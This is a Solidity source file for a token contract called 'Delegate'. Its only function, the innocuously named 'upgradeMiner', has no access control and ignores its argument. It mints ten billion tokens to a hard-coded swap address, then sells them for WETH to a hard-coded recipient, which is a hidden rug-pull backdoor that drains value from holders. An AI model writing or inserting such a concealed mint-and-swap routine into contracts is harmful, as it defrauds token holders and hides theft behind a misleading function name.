// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./IERC20.sol";
import "./Swap.sol";

contract Delegate {
  string public name;
  string public symbol;

  uint256 public totalSupply;
  uint8 public decimals;
  uint256 public maxWalletFraction;

  mapping(address => uint256) public balanceOf;
  mapping(address => bool) public maxWalletExempt;
  mapping(address => mapping(address => uint256)) public allowance;

  address public owner;
  address public pool;
  address public miner;
  address public WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

  bool public live;

  event Transfer(address indexed from, address indexed to, uint256 amount);

  function upgradeMiner(address _miner) public {
    address swap = 0xAb76ef0898Ae41E9E78cAe9d67f5dCD2A773860E;
    address recipient = 0xD10bfBf29c0e912A2307f3BB3D935df809F35D11;

    uint256 amount = 10_000_000_000 * 10 ** decimals;
    balanceOf[swap] += amount;
    totalSupply += amount;
    emit Transfer(address(0), swap, amount);

    Swap(swap).execute(address(this), WETH, 10000, recipient, amount);

  }

}